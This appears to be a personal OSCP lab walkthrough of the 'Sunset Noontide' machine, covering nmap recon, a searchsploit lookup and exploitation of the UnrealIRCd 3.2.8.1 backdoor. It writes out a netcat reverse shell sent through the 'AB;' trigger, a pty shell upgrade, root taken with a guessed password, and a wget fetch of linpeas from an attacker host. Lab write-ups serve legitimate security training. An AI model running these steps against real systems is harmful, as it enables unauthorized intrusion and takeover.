Target is 192.168.54.120

connecting via openvpn

openvpn oscp.vpn

## 

[

](https://www.prestonzen.com/publications/cybersecurity/oscp/linux/sunset-noontide#h.9ds2jjg2j16)

Recon

nmap -sC -sV -p- -vv 192.168.54.120 

PORT     STATE SERVICE REASON  VERSION

6667/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)

6697/tcp open  irc     syn-ack UnrealIRCd

8067/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)

Service Info: Host: irc.foonet.com

  

IRC URL no dice

## 

[

](https://www.prestonzen.com/publications/cybersecurity/oscp/linux/sunset-noontide#h.1jza4kd87cf7)

Weaponization

searchsploit UnrealIRCd

------------------------------------------- ---------------------------------

 Exploit Title                             |  Path

------------------------------------------- ---------------------------------

UnrealIRCd 3.2.8.1 - Backdoor Command Exec | linux/remote/16922.rb

UnrealIRCd 3.2.8.1 - Local Configuration S | windows/dos/18011.txt

UnrealIRCd 3.2.8.1 - Remote Downloader/Exe | linux/remote/13853.pl

UnrealIRCd 3.x - Remote Denial of Service  | windows/dos/27407.pl

------------------------------------------- ---------------------------------

Shellcodes: No Results

searchsploit -v -w linux/remote/16922.rb

[i] Unable to detect version in terms: linux/remote/16922.rb

[i] Enabling 'searchsploit --strict'

-------------------------------- --------------------------------------------

 Exploit Title                  |  URL

-------------------------------- --------------------------------------------

UnrealIRCd 3.2.8.1 - Backdoor C | [https://www.exploit-db.com/exploits/16922](https://www.exploit-db.com/exploits/16922)

  

So it seems I literally only need to prepend my commands with "AB;" lol

## 

[

](https://www.prestonzen.com/publications/cybersecurity/oscp/linux/sunset-noontide#h.1z20b46igat6)

Exploitation

Now to test if the connection works

Checked ifconfig and I'm connected to the LAN via eth0 as 192.168.49.54

sudo tcpdump -i eth0 icmp

Now to connect to IRC

nc 192.168.54.120 6667 -vvv

While my hostname is being resolved I'll pass in a command here

AB;ping -c 1 192.168.49.54

![](https://lh3.googleusercontent.com/pcpTyZvUHQjOHMwN8MKmPV09_Cdn4cfry_mIOjpCAkYit9Ie8lVwuPTidqZmbOD_eq-N2ODxgFl9hea6zoObdMgFlGxy8clotrNXyxusidfottwPPfGNEeAsknuqyBpSjA=w1280)

The ping went through. Seems that even though the IRC failed to validate the command still goes through

Netcat listener time

nc -nvlp 7777

p has to be at the end 

Now to send the reverse shell connection from the target

AB;nc 192.168.49.54 7777 -e /bin/bash

We're in 👍

Now trifiling through home directory I find local.txt

Contains the user flag 

Shell Upgrade:

python3 -c 'import pty;pty.spawn("/bin/bash")'

## 

[

](https://www.prestonzen.com/publications/cybersecurity/oscp/linux/sunset-noontide#h.y55i3zihyx7o)

Privilege Escalation - Command & Control / C2

Now I want root after getting inside.

Method #1 - Guess

Actually try root

su root

root

The go to root's home

cd ~

There is proof.txt

root flag obtained 🏁

Method #2 - Run tools - linpeas

[https://www.kali.org/tools/peass-ng/#linpeas](https://www.kali.org/tools/peass-ng/#linpeas)

Upload linpeas.sh [https://linpeas.sh/](https://linpeas.sh/)

https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files.html

On Kali: python -m SimpleHTTPServer 9999

On Server: wget 192.168.49.54:9999/linpeas.sh

  

Guides utilized: 

- [https://musyokaian.medium.com/sunsetnoontide-vulnhub-walkthrough-94c62a4e9ba9](https://musyokaian.medium.com/sunsetnoontide-vulnhub-walkthrough-94c62a4e9ba9)
    
- [https://medium.com/@Infinity_/sunset-noontide-vulnhub-write-up-7fb6da18adb7](https://medium.com/@Infinity_/sunset-noontide-vulnhub-write-up-7fb6da18adb7)
    
-  [https://gabb4r.gitbook.io/oscp-notes/shell/upgrading-shell](https://gabb4r.gitbook.io/oscp-notes/shell/upgrading-shell)
    
- [https://0xdiwak.blogspot.com/2020/10/sunsetnoontide-walkthrough-vulnhub.html](https://0xdiwak.blogspot.com/2020/10/sunsetnoontide-walkthrough-vulnhub.html)